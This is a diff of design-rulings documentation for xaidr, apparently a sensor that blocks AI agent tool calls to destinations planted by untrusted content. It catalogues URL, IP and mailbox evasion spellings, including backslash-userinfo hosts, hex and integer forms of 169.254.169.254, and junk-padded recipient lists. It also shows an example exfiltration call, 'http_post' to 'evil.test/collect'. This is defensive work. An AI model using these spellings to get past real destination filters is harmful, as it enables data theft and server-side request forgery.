@@ -3,532 +3,319 @@
 _Part of the [xaidr](https://github.com/delphisecurity/xaidr/blob/main/README.md) documentation._
 
 The specification is the value-origin architecture specification. This file
-records every place the core in `xaidr/value_origin/` follows something
-**other than** that document's text: the second batch of rulings, the six
-ambiguities those rulings left open and how the owner settled each, the rulings
-on what the build found, and the decisions that still need a ruling. Where a ruling and the
-document differ, the ruling wins.
+records every place the core in `xaidr/value_origin/` and its seams follow
+something **other than** that document's text, as the behaviour they produce
+today. Each rule names the tests that pin it. Where a ruling and the document
+differ, the ruling wins. Every ruling here is settled; the decisions listed under
+"Accepted as built" can still be overruled.
 
-## Rulings, batch 2
+## 1. Ledgers: binding, lifetime and authority
 
-**3.1 Ledger binding.** A ledger is *explicit* or *implicit* (an internal
-attribute). `begin_flow` and `extract_context` bind explicit
-(`bind_fresh_ledger`). ~~`record_hop` binds explicit only when nothing is bound,
-otherwise it is a no-op (`bind_ledger`).~~ *[Ruling 3.1 CHANGED 2026-10-04: `record_hop` binds NO ledger — see "Ruling 3.1 CHANGED" below.]* An input scan with nothing bound binds
-implicit. A later input scan replaces an implicit ledger (the V-27 cross-user
-fix), never an explicit one. Public `bind_ledger()` is the explicit bind and
-never rebinds an explicit ledger. No new public parameter.
-*Pinned by:* supplementary `R31-*`.
+**A ledger is explicit or implicit** (an internal attribute).
 
-**3.2 Mailbox candidates.** A value is a mailbox-list candidate only if it
-contains `@`. Without `@` it goes to the other schemes or `no_destination`. With
-`@`, it is split on `,` and `;`, and one failing part makes the whole value
-UNRESOLVED. *Pinned by:* `R32-*`, `S20`. **Amended by R1:** the
-parts that did parse are findings too.
+| entry point | binds |
+|---|---|
+| `begin_flow()`, `extract_context()` | a fresh EXPLICIT ledger, unconditionally (`bind_fresh_ledger`) |
+| `xaidr.flow()` | what `begin_flow()` binds; on exit the ledger before the scope is put back |
+| `record_principal_input()` (every input scan) | nothing bound: a fresh IMPLICIT ledger; implicit bound: replaced by a fresh implicit one; explicit bound: kept |
+| `bind_ledger()` | an explicit ledger iff nothing is bound; never rebinds |
+| `record_hop()` | nothing |
+| `clear_flow()` | unbinds |
 
-**3.3 Unresolved findings.** `Finding.destination` is `Authority | None`, and it
-is `None` iff extraction left it unresolved, with reason `walk_bound` or
-`parse_failure`. `expected.jsonl` lists these with a reason and no destination.
-`extract_destinations` returns `tuple[tuple[Finding, ...], bool]`: that fixes
-invalid Python and is a correction, not a design change.
-*Pinned by:* `test_interface`, `S16`, `R32-one-bad-part`, `R33-unparseable-url`.
+`record_principal_input` binds *before* validating, so a faulting input still
+ends the previous request's implicit authority. No public parameter controls
+binding. *Pinned by:* supplementary `R31-*`, `test_ruling_3_1_changed_*`.
 
-**3.4 Bare hosts in principal prose.** The span recorder accepts a bare hostname
-if its last label is an ICANN TLD in the vendored suffix list, or an RFC
-2606/6761 reserved name (`example`, `test`, `invalid`, `localhost`). Argument
-extraction keeps rejecting bare hosts. **Accepted cost:** a filename like
-`notes.md` collides with a real TLD, so naming it records `dns:notes.md`. That
-matters only if an action goes to that host (`R34-icann-tld-cost`).
+**A destination the principal gave keeps authorizing for the rest of that flow,
+never across requests.** Untrusted content never raises it, and nothing lowers it
+(the write rule in `_ledger.py`). *Pinned by:* `S2`, `R31-*`, the reuse and
+request-scope tests below.
 
-**3.5 Flagged input records nothing as principal.** Neither destinations
-nor lookup-key n-grams. *Probe:* `R35-flagged-ngrams`, which goes red if a
-flagged input's n-grams are recorded.
+**A ledger belongs to the request it is bound in, and closes when that request
+ends.** A closed ledger reads as not bound everywhere, including in a context
+copied from the request (a worker task, an executor job), so no later request
+reads its authority. The requests are:
 
-**3.6 IDNA wins.** Unicode domain labels are accepted and UTS-46-encoded to
-A-labels before comparing. Non-ASCII local parts are UNRESOLVED. Reason:
-rejecting non-ASCII domains yields `unresolved`, which never blocks, so it would
-be an evasion. *Homoglyph cases:* `R36-homoglyph-read`,
-`R36-homoglyph-not-principal`.
+- each `concurrent.futures.ThreadPoolExecutor` work item: the first `Sensor`
+  constructed with value origin on installs this once per process, and it
+  touches only xaidr's own context variables;
+- `xaidr.request_scope()`, for a server loop the sensor cannot see (`with` and
+  `async with`);
+- each CrewAI kickoff (`Crew.kickoff`, `akickoff`, `kickoff_async`) and each
+  Agents SDK run (`Runner.run`, `run_sync`) hooked by `protect()`;
+- each fresh `xaidr.flow()` scope.
 
-**3.7 Two PRs.** A1 is the core package: pure, no seams. A2 is the seam wiring
-and starts only after A1 merges. This file ships with A1.
+A request opened inside a live request, or inside a flow the host began with
+`begin_flow()`, joins it and changes nothing. An exit ends every request opened
+inside it. A run hooked inside another hooked run (an Agents SDK
+`Agent.as_tool`, a crew kicked off from a tool) scans its input and does not
+record it as principal input: that input is the outer run's model text. A
+`flow()` scope joins only a scope that is still open. The request seam holds no
+tier state: the provenance chain, tiers and inbound mark are untouched by it.
+*Pinned by:* `tests/test_value_origin_reuse.py`,
+`tests/test_value_origin_request_scope.py`.
 
-## Ambiguities the rulings left open — settled by the owner
+**An inbound A2A message starts a fresh ledger** through the input path (an
+implicit ledger is replaced, an explicit one is kept), and records no
+destination (Q21).
 
-Each was reported before any code depended on it. Every settlement below is the
-owner's choice, not the builder's.
+**A flagged input records nothing as principal**: neither destinations nor key
+n-grams (3.5). Every candidate in it is recorded untrusted. *Probe:*
+`R35-flagged-ngrams`.
 
-| # | question | settled |
+## 2. How a value is read
+
+**The reading principle (2026-10-21).** If any real client could send to an
+address, the core reads the value as going there. A value whose spellings have
+more than one reading names every one of them. This applies to every rule below.
+
+### URLs
+
+- **Every reading of the authority split is a destination** (Q1). The readings:
+  WHATWG (a backslash is a slash; urllib3 and ada agree); RFC 3986 as CPython
+  3.12.2's `urlsplit(...).hostname` reads it (httpx and urllib.parse agree),
+  written out so it is the same on every interpreter; and, where `urlsplit`
+  refuses the WHATWG string, that string's authority split anyway. Each distinct
+  authority is its own finding. *Pinned by:* `Q1-*`,
+  `test_q1_every_reading_of_the_authority_split_is_a_finding`, and
+  `tests/test_differential_oracles.py` (spellings × urllib.parse, httpx, urllib3,
+  ada-url; it refuses to run with an oracle missing).
+- **A special scheme takes its authority after any run of `/` and `\`** (R4):
+  `http:evil.test`, `http:/evil.test`, `http:\\evil.test` and
+  `http:///evil.test` all name `evil.test`. The special schemes are `http`,
+  `https`, `ws`, `wss` and `ftp`. A non-special scheme without `//` has no host.
+  `file:` and `data:` are never destinations; `mailto:<addr>` is a mailbox.
+- **Tabs and newlines are removed from a URL**, as WHATWG and `urlsplit` remove
+  them. Other whitespace counts where it lands: in a host it is no host for that
+  reading; in a path, query or fragment it is percent-encoded by WHATWG, and the
+  host stays readable (`https://evil.test/a b` names `evil.test`). *Pinned by:*
+  `test_whitespace_in_a_url_path_leaves_its_host_readable`.
+- **Percent-encoded hosts are decoded before UTS-46**, as WHATWG host parsing
+  does (`https://ev%69l.test/` names `evil.test`; `R36-percent-host`).
+- **UTS-46: nontransitional, Unicode 13.0** (S-4). ß stays ß (`xn--zca`), as
+  browsers resolve it. CheckBidi on; STD3 rules off; CheckHyphens and
+  VerifyDnsLength off. ZWJ/ZWNJ labels fail (CONTEXTJ needs Joining_Type data
+  the stdlib lacks). The mapping table, bidi classes and combining marks are
+  vendored from Unicode 13.0 (`_idna_data.py`), Python 3.10's `unicodedata`
+  version. A URL host that fails UTS-46 yields `dns:<raw host lowercased>`,
+  which matches only itself. Unicode domain labels are accepted and compared as
+  A-labels (3.6); `R36-homoglyph-*`.
+- **A URL is tried before the mailbox rule** (S-3): a value that opens with
+  `scheme://`, or is a scheme-less `host/path`, is a URL even when it carries
+  `@` (`R32-url-first`).
+- **A `scheme://` value that `urlsplit` refuses** (an unterminated IPv6 bracket)
+  is `parse_failure` as a whole, and every host the other readings find is a
+  finding beside it (R1's shape; `Q1-urlsplit-refusal`).
+
+### Scheme-less values
+
+A client that guesses `http://` (curl) sends each of these where the core reads
+it:
+
+- **`host[:port]/path`**: a name of at least two labels with an alphabetic last
+  label, an optional port, then a path (`evil.test/x`, `evil.test:8080/x`). It is
+  read as `http://` + the value, every reading included.
+- **An address literal followed by a port, path, query or fragment**: a dotted
+  quad or IPv6 in brackets, in a result or an argument
+  (`169.254.169.254/latest`, `10.0.0.5:80`).
+- **An address in any inet_aton spelling followed by a port, path, query or
+  fragment**, in an argument: hex, octal, decimal and short dotted forms
+  (`0xA9FEA9FE/latest`, `2852039166/latest`, `0251.0376.0251.0376/latest`,
+  `169.254.43518/latest` all read 169.254.169.254; `2024/report` reads
+  0.0.7.232). Results record only the strict forms above, so a path in a file
+  listing is not recorded as an address. *Pinned by:*
+  `test_integer_ip_forms_with_no_scheme_read_as_the_address_they_reach`,
+  `test_an_integer_host_with_a_path_reads_as_its_address`.
+- **Not destinations:** a bare hostname (V-19), with or without a port; a bare
+  number or version (`2852039166`, `1.2`); a dotted value no resolver reads as an
+  address (`999.1.1.1/x`); a name whose last label is not alphabetic
+  (`report.v2/summary`); a scheme-less value with whitespace in it.
+  *Pinned by:* `test_values_that_are_not_destinations`.
+
+### Addresses
+
+- **One normaliser**: every literal form (hex, octal, decimal, short dotted,
+  IPv4-mapped IPv6), mapped addresses unwrapped before rendering
+  (`coerce_ip`, `ip_key`).
+- **An empty hex part is 0**: `https://0x.0x.0/` is `ip:0.0.0.0`, as WHATWG's IPv4
+  number parser reads it everywhere and the macOS resolver reads it.
+  `M3-empty-hex-part`; `test_an_empty_hex_part_is_the_zero_address`.
+- **Integer parts are digit-checked**, not left to `int()`, which takes `_`
+  separators no resolver reads (`0x_1.1.1.1` is a name).
+- **The macOS resolver's readings are read on every platform** (Q22, re-ruled):
+  a leading-zero dotted quad read as decimal, the IPv4 tail of an IPv6 literal
+  read the same way, and one number above 2**32 - 1 wrapped modulo 2**32
+  (`4294967296` and `0x100000000` read `0.0.0.0`; `0x1A9FEA9FE` reads
+  169.254.169.254). Each is one more finding beside the inet_aton reading, public
+  addresses included. *Pinned by:* `Q22-rerule-macos-decimal-quad`,
+  `tests/test_differential_oracles.py` (the `_macos_reading` rows and
+  `test_q22_*`).
+
+### Mailboxes
+
+- **A value with `@` that is not a URL is a mailbox-list candidate** (3.2). It is
+  split on `,` and `;` outside `<…>` and `"…"`. Without `@` it goes to the other
+  schemes or `no_destination`. An empty part (`"a@x.example; "`) is skipped.
+- **One failing part makes the whole value `unresolved`, and every part that
+  parsed is its own finding** (R1), so an untrusted part decides the wire. A
+  trusted or principal part beside junk stays `unresolved` as a whole.
+  *Pinned by:* `R32-*`, `S20`,
+  `test_r1_an_untrusted_part_beside_junk_blocks_and_a_trusted_one_does_not`.
+- **A mailbox inside a part that does not parse is a finding too**, when the part
+  holds one address and only junk (no letter or digit) or a display name opening
+  `<` surrounds it: the address in `evil@x.example <` or `Bob <evil@x.example` is
+  read, as `email.utils` reads it. Prose that mentions an address
+  (`Please send the report to bob@corp.example.`) is not a recipient list, and a
+  candidate that starts mid-word (`jürgen@…` is not `rgen@…`) or runs into more
+  text (`user@evil.test/x`) is not a mailbox. *Pinned by:*
+  `test_an_untrusted_mailbox_beside_junk_in_the_same_part_decides_the_wire`,
+  `test_prose_that_mentions_an_address_is_not_a_recipient_list`, and the mailbox
+  checks in both differentials: each mailbox finding is one written verbatim in
+  the value, or one at a domain `email.utils` reads.
+- **Quoting that does not balance is junk**: the whole value fails, and its `,` and
+  `;` are taken literally to find the parts that parse
+  (`R32-untrusted-unbalanced-quote`).
+- **The local part is ASCII by grammar.** A non-ASCII local part is `unresolved`
+  (3.6; `R36-nonascii-local`). The domain may be Unicode and is UTS-46-encoded.
+  No plus-stripping and no dot removal: both collide distinct mailboxes (S18).
+
+### Phones and bare hosts in prose
+
+- **`tel:` is for `+`-prefixed phones only.** A national number needs a region to
+  normalise.
+- **The span recorder accepts a bare hostname in prose** if its last label is an
+  ICANN TLD in the vendored suffix list, or an RFC 2606/6761 name (`example`,
+  `test`, `invalid`, `localhost`) (3.4). The same filter applies to result text
+  (S-5): one candidate extractor serves spans and results. A filename that ends in
+  a real TLD (`notes.md`) records `dns:notes.md`; that matters only if an action
+  goes to that host (`R34-icann-tld-cost`).
+
+## 3. A value that names more than one destination
+
+The core never picks one. Every destination a value names is its own finding,
+and the weakest decides the wire (R1, Q1). `authority_of` returns `None` for a
+value with two authorities, exactly as for a two-mailbox list, and
+`extract_destinations` reports all of them.
+*Pinned by:* `test_q1_authority_of_answers_none_for_a_value_with_two_authorities`.
+
+## 4. Trust
+
+- A `URL_PREFIX` designation matches with no userinfo, equal lowercased schemes,
+  equal lowercased hosts, equal ports after mapping 80/443 to absent, and the
+  pattern's path segments a segment-wise prefix of the value's. Query and fragment
+  are ignored.
+- **A value path with a `.` or `..` segment never matches** (percent-decoded
+  too): `/public/../private/x` is not trusted as `/public` (R3,
+  `S28b-dot-segment`).
+- **A value with more than one reading never matches**: across the 47,124
+  spellings of the differential corpus, every value a designation matches is one
+  the core reads as exactly one authority
+  (`test_a_url_prefix_designation_never_trusts_a_value_with_several_readings`).
+- A trusted read with several authorizing designations takes both the label and
+  the declared flag from the first authorizing designation (in the operator's
+  order). `DestinationFinding.span_declared` is set for `TRUSTED_SOURCE` as well
+  as `PRINCIPAL`; `TRUSTED_SOURCE` with `span_declared=False` maps to wire
+  `principal_undeclared_span`.
+
+## 5. Recording and its bounds
+
+- **`record_principal_input` writes two all-or-none units** (S-6): its
+  destinations, then its key n-grams, so a long prompt's n-grams can be dropped
+  without dropping the principal's addresses. `record_tool_result` is one unit,
+  and atoms found past a bound are a separate unit after it.
+- **Budgets.** 10,000 destination digests and 65,536 key n-grams per ledger, each
+  its own budget. Key n-grams come from the first 64 KiB of principal input;
+  destination atoms come from all of it. The atom pass past a bound is bounded by
+  WORK: each scanned character costs 1 and each candidate examined costs 64,
+  500,000 units per seam call (`ATOM_WORK_BUDGET`); a result's examined pass is
+  bounded the same way at 1,000,000 units (`EXAMINED_WORK_BUDGET`).
+- **The argument walk**: depth-first in insertion order, a dict's keys walked as
+  leaves before its values, sets in sorted order (hash randomisation would
+  otherwise change which leaves the 64-leaf bound selects). A walk that hits a
+  bound yields one `walk_bound` finding, whose `path` is `()`.
+
+## 6. Wire values and what blocks
+
+Fifteen wire values. `verdict_of` is total over them, and a string outside them
+is `NOT_EVALUATED`, matching `row_text`'s unrecognised row.
+
+| wire | verdict | blocks under ENFORCE |
 |---|---|---|
-| S-1 | 3.3's `Finding` against §1.2's `DestinationFinding` | **Two types.** `Finding{path, destination: Authority \| None, reason: UnresolvedReason \| None}` is what `extract_destinations` returns. `DestinationFinding` keeps its fields, except `authority` is renamed `destination: Authority \| None` and it gains `reason`. `UnresolvedReason` is a str enum `{walk_bound, parse_failure}`. All three are exported. |
-| S-2 | which public entry point binds the implicit ledger (3.1, no new parameter) | **`record_principal_input` binds.** Nothing bound → a fresh implicit ledger. Implicit bound → replaced by a fresh implicit ledger. Explicit bound → kept. It binds *before* validating, so a faulting input still ends the previous request's authority. This drops §1.4's "Does not bind" for that one function. `bind_ledger()` stays a no-op whenever anything is bound, which is what `record_hop` needs. | *[Ruling 3.1 CHANGED 2026-10-04: `record_hop` binds NO ledger — see docs/value-origin-rulings.md, "Ruling 3.1 CHANGED".]*
-| S-3 | 3.2 against URLs that carry `@` (`https://corp.example@evil.test/`) | **URL first.** A whole value that opens with `scheme://`, or is V-19's `host/path`, is tried as a URL before the mailbox rule, so C-6/V-23 hold and the host is `evil.test`. The literal reading made the userinfo spelling UNRESOLVED, an evasion of a recorded untrusted host (`R32-url-first`). |
-| S-4 | 3.6's "UTS-46" against the doc's stdlib `idna` codec (IDNA2003) | **Nontransitional, Unicode 13.0.** ß stays ß (`xn--zca`), as browsers resolve it. CheckBidi on; STD3 rules off; CheckHyphens and VerifyDnsLength off. ZWJ/ZWNJ labels fail, because CONTEXTJ needs Joining_Type data the stdlib lacks. The mapping table, bidi classes and combining marks are vendored from Unicode 13.0 (`_idna_data.py`). 13.0 is Python 3.10's `unicodedata` version, so every valid code point is assigned on every supported interpreter, and NFC is stable for assigned code points. On failure, an argument URL host yields `dns:<raw host lowercased>` (V-23) and a mailbox is UNRESOLVED. |
-| S-5 | whether 3.4's TLD filter applies to bare hosts in **result** text | **The same filter for both.** One candidate extractor serves spans and results (`R34-result-same-filter*`). Cost: a poisoned read that names a bare `evil.corpnet` (no scheme, non-ICANN last label) is not recorded, so a call there is `unresolved`. Scheme URLs are unaffected. |
-| S-6 | the specification's "each call all-or-none" against its "destinations before n-grams" | **Two atomic units.** `record_principal_input` writes its destinations as one all-or-none unit, then its n-grams as a second, so a long prompt's n-grams can be dropped without dropping the principal's addresses (`test_v16d_*`). `record_tool_result` is one unit. |
+| `principal`, `principal_undeclared_span`, `trusted_source` | authorized | no |
+| `untrusted_source` | unauthorized | **yes** (`ORIGIN_UNTRUSTED_DESTINATION`, category `untrusted_destination`) |
+| `unresolved`, `argument_bound` | unresolved | no |
+| `result_unread` | not evaluated | **yes** (`ORIGIN_UNEXAMINABLE_SOURCE` with `intent.value_origin_untrusted`, category `unexaminable_source`) |
+| `write_dropped` | not evaluated | **yes** (as `result_unread`) |
+| `no_destination`, `no_flow`, `ledger_absent`, `ledger_saturated`, `input_truncated`, `result_truncated`, `extraction_incomplete` | not evaluated | no |
 
-## Rulings on what the build found
+- **`result_unread`**: a tool result from httpx, requests, urllib3 or aiohttp is
+  passed on unread, so as not to consume a stream; a destination that then traces
+  to nothing reads `result_unread` (Q18).
+- **`write_dropped`**: a destination write the ledger did not accept. That is a
+  full ledger, or a write lost to a fault: a raising `model_dump` in the examined
+  pass, a span list that does not concatenate to the text, a span item that is
+  not a `Span`, a non-string input (ruling 5). Past the examined bound, a raising
+  node is confined to its node and reads `result_unread`. *Pinned by:*
+  `tests/test_value_origin_drop.py`.
+- **The order** when the weakest finding is not `untrusted_source`: a state that
+  blocks outranks every state that does not (`result_unread`, then
+  `write_dropped`), then `extraction_incomplete`, `argument_bound`,
+  `ledger_saturated`, `result_truncated`, `input_truncated`. An untrusted finding
+  outranks all of them.
+- `ORIGIN_UNTRUSTED_DESTINATION_KEYED` (the keyed variant) is reserved; nothing
+  emits it.
 
-On what the A1 build found (below) and on the build's decisions. Settled by the
-owner.
+## 7. The wire field
 
-**R1: 3.2's mailbox-list evasion is fixed.** Under 3.2 as written,
-`to="evil@x.example, junk"` was UNRESOLVED as a whole, even with
-`evil@x.example` recorded untrusted, so it never blocked under ENFORCE. An
-attacker appended junk and walked through. Now the value stays UNRESOLVED as a
-whole (one `parse_failure` finding), **and** every part that parsed yields its
-own finding, so an untrusted part decides the wire. A trusted or principal part
-beside junk stays UNRESOLVED and does not newly block.
-*Pinned by:*
-- `R32-untrusted-plus-bad-part`, flipped from pinning the old behaviour (junk
-  after, `,`).
-- `R32-untrusted-junk-before`, `R32-untrusted-junk-semicolon` and
-  `R32-two-untrusted-parts`.
-- `R32-trusted-plus-junk` and `R32-one-bad-part`: neither blocks.
-- `test_r1_an_untrusted_part_beside_junk_blocks_and_a_trusted_one_does_not`,
-  which asserts `should_block` under ENFORCE for each of these.
+`valueOrigin` is on every tool-call event, behind `value_origin_wire`. The
+default `"v1"` emits exactly the nine values the consumer accepts and withholds
+the other six, naming each in a warning once; `"v2"` emits all fifteen; `"off"`
+emits nothing. `SCHEMA_VERSION` is 0.3.0 (Q14). The Splunk TA's metadata names
+schema 0.2.0, and `KV_MODE = json` extracts `gen_ai.security.value_origin` from
+0.3.0 events.
 
-**R2: percent-decoding hosts before UTS-46 is accepted as built** (formerly
-build decision 1). It closes the same evasion shape as R1: without it,
-`https://ev%69l.test/` walks past a recorded `evil.test` (`R36-percent-host`).
+## 8. The paid product
 
-**R3: URL_PREFIX refusing `.` and `..` segments is accepted as built**
-(formerly build decision 2). It is the no-trust direction (`S28b-dot-segment`).
+The paid product is the open sensor plus an overlay, and inherits open's
+behaviour for everything in this file, including S25 (a principal-only emit with
+`set_origin` reads `no_flow` then `unresolved`) and every SEMANTIC row in the
+conformance files.
 
-**R4: two spellings the scheme-less `host/path` rule missed are fixed.** Under
-that rule as written, both were `no_destination`.
-- **`http:evil.test`.** A WHATWG special scheme takes its authority after any
-  run of `/` and `\`. The special schemes are `http`, `https`, `ws`, `wss` and
-  `ftp`; `file` is never a destination. So `http:evil.test`,
-  `http:/evil.test`, `http:\\evil.test` and `http:///evil.test` all name
-  `evil.test`. The value is rewritten to `scheme://` and parsed as one. A
-  non-special scheme without `//` has no host (`gopher:evil.test`); WHATWG and
-  urllib.parse agree on that.
-- **`169.254.169.254/latest`.** A scheme-less value that opens with a strict
-  address literal is that address when a port, path, query or fragment
-  follows. A strict literal is a dotted quad, or IPv6 in brackets.
+## 9. Accepted as built
 
-*Pinned by:*
-- `V19-special-no-slashes` and `V19-ip-path`.
-- Their `-untrusted` twins, where the spelling would otherwise walk past a
-  recorded untrusted address.
-- `test_v19_every_spelling_resolves_to_the_host_urllib_parse_finds`. It
-  compares the core with the host urllib.parse finds for 5,632 spellings:
-  every scheme, separator, host form and tail. A rule that matches the scheme
-  literal instead of the address lets most spellings of 169.254.169.254 past it
-  (nine of fifteen in a sample); a rule of that shape fails this test.
+Each is current behaviour and can still be overruled.
 
-**Build decisions 3 to 10 below are accepted as built.** That includes 6:
-`file:` and `data:` are never destinations.
-
-## Decisions made in the A1 build, ruled with R1 to R4
-
-All ten are accepted.
-
-1. **Accepted (R2).** **Percent-encoded URL hosts are decoded** before UTS-46,
-   as WHATWG host parsing does. Otherwise `https://ev%69l.test/` would evade a
-   recorded `evil.test` (`R36-percent-host`).
-2. **Accepted (R3).** **URL_PREFIX refuses a value path with a `.` or `..`
-   segment** (percent-decoded too). The specification is silent. Without this,
-   `/public/../private/x` is trusted as `/public`. Refusing is the no-trust
-   direction (`S28b-dot-segment`).
-3. **`verdict_of` of a string outside the nine returns `NOT_EVALUATED`**
-   instead of raising, keeping the specification's never-raises contract. This matches
-   `row_text`'s not_recorded row for an unrecognised value.
-4. **An empty part of a mailbox list is skipped** (`"a@x.example; "`), not
-   treated as a failing part.
-5. **Sets in arguments are walked in sorted order.** Their iteration order
-   changes with hash randomisation, and the 64-leaf bound would otherwise select
-   different leaves in different processes.
-6. **`file:` and `data:` URLs are never destinations**, even `file://host/…`
-   (file-system writes belong to L2). `mailto:<addr>` is a mailbox.
-7. **A `scheme://` value that `urlsplit` rejects** (for example an unterminated
-   IPv6 bracket) is `parse_failure`, not `no_destination`.
-8. A `walk_bound` finding's `path` is `()`.
-9. A trusted read with several authorizing designations takes **both the label
-   and the declared flag** from the first authorizing designation (the
-   specification names the label only).
-10. `DestinationFinding.span_declared` is set for `TRUSTED_SOURCE` as well as
-    `PRINCIPAL`. `TRUSTED_SOURCE` with `span_declared=False` maps to
-    wire `principal_undeclared_span`.
-
-## Decisions made in the R1 / R4 build that still need a ruling
-
-Each is listed so it can be overruled, not so it can pass unnoticed.
-
-1. **R1 treats a mailbox list whose quoting does not balance as junk.** The
-   whole value fails, and its `,` and `;` are taken literally to find the parts
-   that parse (`R32-untrusted-unbalanced-quote`). Without this,
-   `evil@x.example, "` hides an untrusted mailbox exactly as `, junk` did, and
-   `email.utils.getaddresses` reads `evil@x.example` out of it.
-2. **R1's finding order.** The whole-value `parse_failure` finding comes first,
-   then the parts that parsed, in text order.
-3. **R1 in a saturated ledger.** A part that parsed is a destination like any
-   other, so the specification's ledger-saturation step applies to it. After a drop, `x@…, junk` whose part
-   misses reports `ledger_saturated`; before R1 the part was invisible and the
-   value read `unresolved`. Neither blocks, and an untrusted part still outranks
-   the blind spot
+1. A mailbox list whose quoting does not balance is junk (§2, Mailboxes).
+2. R1's finding order: the whole-value `parse_failure` finding first, then the
+   parts that parsed, in text order.
+3. In a saturated ledger a part that parsed is a destination like any other, so
+   `x@…, junk` whose part does not trace reads `ledger_saturated`; an untrusted
+   part still outranks it
    (`test_r1_a_parsed_part_that_misses_in_a_saturated_ledger_reports_saturation`).
-4. **R4: what may follow the IP literal.** The ruled spelling is a dotted quad
-   with a path. A port alone (`10.0.0.5:80`), a query and a fragment count too,
-   and so does IPv6 in brackets. Each is the same address with a different
-   locator.
-5. **R4 takes strict literals only.** The integer spellings stay
-   `no_destination` with no scheme; see the list below.
-6. **R4's accepted costs.**
-   - A CIDR like `10.0.0.0/8` now reads as `ip:10.0.0.0`. That is UNRESOLVED
-     unless something recorded it.
-   - A special-scheme value containing whitespace (`http:evil.test/a b`) is now
-     `parse_failure`, which `http://evil.test/a b` already was.
-   - `HTTP: 404` is not a URL, because a space follows the colon.
-7. **R4 also reaches prose and results.** The prose URL scan already matched
-   `http:///evil.test` but found it hostless and blanked it. Now it records
-   `evil.test`. Prose `http:evil.test` was already recorded, by the bare-host
-   scan.
-
-## Found, reported, not fixed (the rulings as written produce these)
-
-Every item except the last has a strict-xfail test. The test goes red, and so
-has to be updated, the day its defect is fixed. The last item is a measurement
-note.
-
-- **Junk in the same part still hides an untrusted mailbox.** R1 works on the
-  parts of a `,`/`;` split. `evil@x.example <` is one part, and it fails, so it
-  is UNRESOLVED; `email.utils.getaddresses` reads `evil@x.example` out of it
-  (`test_r1_residual_junk_inside_the_part_still_hides_an_untrusted_mailbox`).
-- **Integer IP forms with no scheme.** These all stay `no_destination`:
-  `0xA9FEA9FE/latest`, `2852039166/latest`, `0251.0376.0251.0376/latest` and
-  `169.254.43518/latest`. urllib.parse, given an implied `http://`, finds
-  169.254.169.254 in each, and curl, which guesses `http://`, reaches it. The
-  scheme-less `host/path` rule confines these spellings to a URL host because `2024/report` is a path
-  (`test_v19_residual_integer_forms_with_no_scheme`).
-- **A name with a port and no scheme.** `evil.test:8080/x` is `no_destination`,
-  because the scheme-less `host/path` rule needs the path straight after the name
-  (`test_v19_residual_a_name_with_a_port_and_no_scheme`).
-- **Whitespace in a URL path hides its host.** Whitespace anywhere in a
-  `scheme://` value is `parse_failure`, so `https://evil.test/a b` is
-  UNRESOLVED even with `evil.test` recorded untrusted. WHATWG percent-encodes
-  the space, and the host is still `evil.test`
-  (`test_residual_whitespace_in_a_url_path_hides_its_host`).
-- **An empty hex part is read as a name.** It was found by the A2 adversarial
-  run on WPT. WHATWG (ada) reads `https://0x.0x.0/` as `0.0.0.0`, and so does the
-  macOS libc resolver that httpx and urllib3 hand the name to; glibc does not.
-  `coerce_ip` raises on `int("0x", 16)` and reads `dns:0x.0`. It belongs to the
-  integer-spelling family and is fixed where `coerce_ip` is shared (A2's
-  `url_parse` milestone), not by Q1
-  (`test_residual_empty_hex_part_is_the_zero_address`).
-- **The first-emission race is rarely observable through the public API.** The
-  unlocked window in this core is one `_merge` call, inside a much longer
-  extraction. With the lock removed, the S22 first-emission test went red in 1 of
-  3 measured runs. The lock's other guarantee, all-or-none visibility of a
-  multi-entry write, went red in 20 of 20 runs on 3.12 and on 3.14. That second
-  test is the reliable R4 detector. Both tests stay in the suite.
-
-## Ruling 2026-10-03 (A2, Q1): V-23 is amended — every reading of the split
-
-**V-23 said:** backslashes in the scheme-relative part are replaced with `/`
-before `urlsplit`, as WHATWG does, "so `https://evil.test\@corp.example/` has
-host `evil.test`". **Amended:** that is ONE reading of the authority split. A
-URL whose readings name different authorities names ALL of them. Each is its
-own finding, and the weakest decides the wire. That is R1's shape for mailbox
-parts, so the core stays consistent with itself. Ruled by the owner; it gates
-ENFORCE.
-
-**Why.** The real consumers disagree with each other, so "the host" depends on
-who reads the URL. Measured 2026-10-03 with httpx 0.28.1, urllib3 2.8.0 and
-ada-url 4.0.0:
-
-    https://corp.example\@evil.test/x    WHATWG (ada), urllib3: corp.example
-                                         httpx, urllib.parse:   evil.test
-
-Reading only the WHATWG side made `http_post(url="https://corp.example\@evil.test/collect")`,
-with `evil.test` recorded untrusted, come back **`principal`, AUTHORIZED**,
-while ~~httpx and urllib sent it~~ httpx sent it to `evil.test`. That is
-finding 1, the 1.15.0 userinfo-bypass shape in new code. Choosing one reading
-is choosing which transport may be bypassed.
-
-*[Corrected 2026-10-03, M0 milestone review: "httpx and urllib sent it" was
-false for urllib. `urllib.request` passes the netloc, percent-decoded (*M2 review: not "raw"*),
-(`corp.example\@evil.test`) to http.client and reaches neither host. It is
-`urllib.parse`'s `urlsplit(...).hostname` that reads `evil.test`, and xaidr's
-own `ProtectedHttpClient._extract_host` decides destination policy with it.
-The ruling stands on httpx alone.]*
-
-~~Before the fix, the multi-oracle differential found 3,703 under-reads across
-31,752 generated spellings (urllib.parse 1,705, httpx 1,674, ada 324).~~
-*[Corrected, same review: those figures came from the FIRST grid, before it was
-extended, and cannot be regenerated from the committed one.]* On the committed
-corpus of **47,124 spellings**, the pre-fix core (base `25dc9de`) has **10,780
-under-reads** (urllib.parse 1,789, httpx 2,538, urllib3 945, ada 5,508). After
-the fix it has **none**, on CPython 3.12.2 (macOS) and on 3.10.21 and 3.12.14
-(Linux).
-
-*Pinned by:*
-- `Q1-backslash-userinfo-bypass`, `Q1-backslash-userinfo-mirror`,
-  `Q1-backslash-nonspecial-scheme`, `Q1-backslash-readings-agree` (does not
-  block) and `Q1-urlsplit-refusal`;
-- `test_q1_a_url_blocks_on_the_host_the_transport_reaches` (should_block under
-  ENFORCE);
-- `test_q1_a_poisoned_result_records_every_reading_of_its_url`;
-- `test_q1_every_reading_of_the_authority_split_is_a_finding`;
-- `V23-backslash`, whose findings changed to both hosts while its wire stayed
-  `unresolved`;
-- `tests/test_differential_oracles.py`, which is spellings × {urllib.parse,
-  httpx, urllib3, ada-url} and refuses if any oracle is missing (Q3).
-
-## Decisions made in the A2 build (M0) that still need a ruling
-
-Each is listed so it can be overruled, not so it can pass unnoticed.
-
-1. **The RFC 3986 reading is a written-out split, not this interpreter's
-   `urlsplit`. It reads exactly what CPython 3.12.2's `urlsplit(...).hostname`
